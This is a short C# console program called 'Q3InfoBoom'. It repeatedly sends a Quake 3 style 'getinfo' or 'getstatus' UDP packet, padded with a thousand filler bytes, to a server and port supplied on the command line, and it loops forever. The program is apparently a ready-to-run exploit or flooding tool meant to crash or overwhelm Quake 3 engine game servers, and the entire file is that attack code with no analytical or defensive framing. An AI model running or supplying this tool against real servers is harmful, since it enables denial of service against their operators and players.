using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace Q3InfoBoom
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var server = args[0];
            var port = int.Parse(args[1]);
            bool status = args.Length == 3;
            var client = new UdpClient(server, port);
            var writer = new BinaryWriter(new MemoryStream());
            var reader = new BinaryReader(writer.BaseStream);
            writer.Write(new byte[] {0xFF, 0xFF, 0xFF, 0xFF});
            writer.Write((status ? "getstatus " : "getinfo ").ToCharArray());
            for (var i = 0; i < 1000; i++)
                writer.Write('x');
            reader.BaseStream.Position = 0;
            var bytes = reader.ReadBytes((int)reader.BaseStream.Length);
            while (true)
            {
                client.Send(bytes, bytes.Length);
                Console.WriteLine("Send packet to {0}:{1}", server, port);
                Thread.Sleep(100);
            }
        }
    }
}